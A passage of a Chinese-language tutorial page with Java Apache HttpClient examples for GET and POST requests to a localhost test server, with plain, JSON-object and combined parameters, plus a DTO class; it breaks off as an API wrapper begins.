设置请求超时时间(单位毫秒)</span></span><br><span class="line">                    .setConnectionRequestTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// socket读写超时时间(单位毫秒)</span></span><br><span class="line">                    .setSocketTimeout(<span class="number">5000</span>)</span><br><span class="line">                    <span class="comment">// 设置是否允许重定向(默认为true)</span></span><br><span class="line">                    .setRedirectsEnabled(<span class="literal">true</span>).build();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将上面的配置信息 运用到这个Get请求里</span></span><br><span class="line">            httpGet.setConfig(requestConfig);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 由客户端执行(发送)Get请求</span></span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放实体资源</span></span><br><span class="line">            EntityUtils.consume(responseEntity);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 释放资源</span></span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h1><h2 id="无参-1"><a href="#无参-1" class="headerlink" title="无参"></a>无参</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPost1</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="comment">// 获得Http客户端</span></span><br><span class="line">       <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line">       <span class="comment">// 创建Post请求</span></span><br><span class="line">       <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;http://localhost:8080/doPost1&quot;</span>);</span><br><span class="line">       <span class="comment">// 响应模型</span></span><br><span class="line">       <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 由客户端执行(发送)Post请求</span></span><br><span class="line">           response = httpClient.execute(httpPost);</span><br><span class="line">           System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">           <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">           <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//释放实体资源</span></span><br><span class="line">           EntityUtils.consume(responseEntity);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">// 释放资源</span></span><br><span class="line">               <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                   httpClient.close();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                   response.close();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="有参（普通参数）"><a href="#有参（普通参数）" class="headerlink" title="有参（普通参数）"></a>有参（普通参数）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPost2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获得Http客户端</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参数</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 字符数据最好encoding以下;这样一来，某些特殊字符才能传过去(如:某人的名字就是“&amp;”,不encoding的话,传不过去)</span></span><br><span class="line">            params.append(<span class="string">&quot;name=&quot;</span>).append(URLEncoder.encode(<span class="string">&quot;nan&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    .append(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">                    .append(<span class="string">&quot;age=24&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Post请求</span></span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;http://localhost:8080/doPost2&quot;</span> + <span class="string">&quot;?&quot;</span> + params);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置ContentType(注:如果只是传普通参数的话,ContentType不一定非要用application/json)</span></span><br><span class="line">        httpPost.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json;charset=utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 响应模型</span></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 由客户端执行(发送)Post请求</span></span><br><span class="line">            response = httpClient.execute(httpPost);</span><br><span class="line">            System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">                System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 释放资源</span></span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="有参（对象参数）"><a href="#有参（对象参数）" class="headerlink" title="有参（对象参数）"></a>有参（对象参数）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPost3</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="comment">// 获得Http客户端</span></span><br><span class="line">       <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创建Post请求</span></span><br><span class="line">       <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;http://localhost:8080/doPost3&quot;</span>);</span><br><span class="line">       <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">       user.setName(<span class="string">&quot;霍华德&quot;</span>);</span><br><span class="line">       user.setAge(<span class="number">35</span>);</span><br><span class="line">       user.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">       user.setMotto(<span class="string">&quot;扣篮要暴力~&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 利用阿里的fastjson，将Object转换为json字符串;</span></span><br><span class="line">       <span class="comment">// (需要导入com.alibaba.fastjson.JSON包)</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line"></span><br><span class="line">       <span class="type">StringEntity</span> <span class="variable">entity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(jsonString, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// post请求是将参数放在请求体里面传过去的;这里将entity放入post请求体中</span></span><br><span class="line">       httpPost.setEntity(entity);</span><br><span class="line"></span><br><span class="line">       httpPost.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json;charset=utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 响应模型</span></span><br><span class="line">       <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 由客户端执行(发送)Post请求</span></span><br><span class="line">           response = httpClient.execute(httpPost);</span><br><span class="line">           System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">           <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">           <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//释放实体资源</span></span><br><span class="line">           EntityUtils.consume(responseEntity);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">// 释放资源</span></span><br><span class="line">               <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                   httpClient.close();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                   response.close();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="有参（普参-对参）"><a href="#有参（普参-对参）" class="headerlink" title="有参（普参+对参）"></a>有参（普参+对参）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPost4</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="comment">// 获得Http客户端</span></span><br><span class="line">       <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().build();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创建Post请求</span></span><br><span class="line">       <span class="comment">// 参数</span></span><br><span class="line">       <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 将参数放入键值对类NameValuePair中,再放入集合中</span></span><br><span class="line">           List&lt;NameValuePair&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">           params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;4&quot;</span>));</span><br><span class="line">           params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;meaning&quot;</span>, <span class="string">&quot;这是普通参数&quot;</span>));</span><br><span class="line">           <span class="comment">// 设置uri信息,并将参数集合放入uri;</span></span><br><span class="line">           <span class="comment">// 注:这里也支持一个键值对一个键值对地往里面放setParameter(String key, String value)</span></span><br><span class="line">           uri = <span class="keyword">new</span> <span class="title class_">URIBuilder</span>().setScheme(<span class="string">&quot;http&quot;</span>).setHost(<span class="string">&quot;localhost&quot;</span>).setPort(<span class="number">8080</span>)</span><br><span class="line">                   .setPath(<span class="string">&quot;/doPost4&quot;</span>).setParameters(params).build();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(uri);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创建user参数</span></span><br><span class="line">       <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">       user.setName(<span class="string">&quot;霍华德&quot;</span>);</span><br><span class="line">       user.setAge(<span class="number">35</span>);</span><br><span class="line">       user.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">       user.setMotto(<span class="string">&quot;扣篮要暴力~&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 将user对象转换为json字符串，并放入entity中</span></span><br><span class="line">       <span class="type">StringEntity</span> <span class="variable">entity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(JSON.toJSONString(user), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// post请求是将参数放在请求体里面传过去的;这里将entity放入post请求体中</span></span><br><span class="line">       httpPost.setEntity(entity);</span><br><span class="line"></span><br><span class="line">       httpPost.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json;charset=utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 响应模型</span></span><br><span class="line">       <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 由客户端执行(发送)Post请求3</span></span><br><span class="line">           response = httpClient.execute(httpPost);</span><br><span class="line">           System.out.println(<span class="string">&quot;响应状态为:&quot;</span> + response.getStatusLine());</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 从响应模型中获取响应实体</span></span><br><span class="line">           <span class="type">HttpEntity</span> <span class="variable">responseEntity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (responseEntity != <span class="literal">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容长度为:&quot;</span> + responseEntity.getContentLength());</span><br><span class="line">               System.out.println(<span class="string">&quot;响应内容为:&quot;</span> + EntityUtils.toString(responseEntity));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//释放实体资源</span></span><br><span class="line">           EntityUtils.consume(responseEntity);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">// 释放资源</span></span><br><span class="line">               <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                   httpClient.close();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                   response.close();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="GET和POST请求封装"><a href="#GET和POST请求封装" class="headerlink" title="GET和POST请求封装"></a>GET和POST请求封装</h1><p><strong>DTO对象的封装：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2021/06/07/9:15 PM</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: ApiUtil所需要的DTO对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiRequest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用的api接口名</span></span><br><span class="line">    <span class="keyword">private</span> String apiUrl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接口响应时间</span></span><br><span class="line">    <span class="keyword">private</span> Long callTimeStamp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//状态码200（正常）/400（异常）</span></span><br><span class="line">    <span class="keyword">private</span> Integer returnCode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//请求参数</span></span><br><span class="line">    <span class="keyword">private</span> Object request;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回结果</span></span><br><span class="line">    <span class="keyword">private</span> Object result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getApiUrl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> apiUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setApiUrl</span><span class="params">(String apiUrl)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.apiUrl = apiUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Long <span class="title function_">getCallTimeStamp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callTimeStamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCallTimeStamp</span><span class="params">(Long callTimeStamp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.callTimeStamp = callTimeStamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getReturnCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> returnCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReturnCode</span><span class="params">(Integer returnCode)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.returnCode = returnCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRequest</span><span class="params">(Object request)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.request = request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getResult</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResult</span><span class="params">(Object result)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.result = result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ApiRequest&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;apiUrl=&#x27;&quot;</span> + apiUrl + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, callTimeStamp=&quot;</span> + callTimeStamp +</span><br><span class="line">                <span class="string">&quot;, returnCode=&quot;</span> + returnCode +</span><br><span class="line">                <span class="string">&quot;, request=&quot;</span> + request +</span><br><span class="line">                <span class="string">&quot;, result=&quot;</span> + result +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>调用接口的封装：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 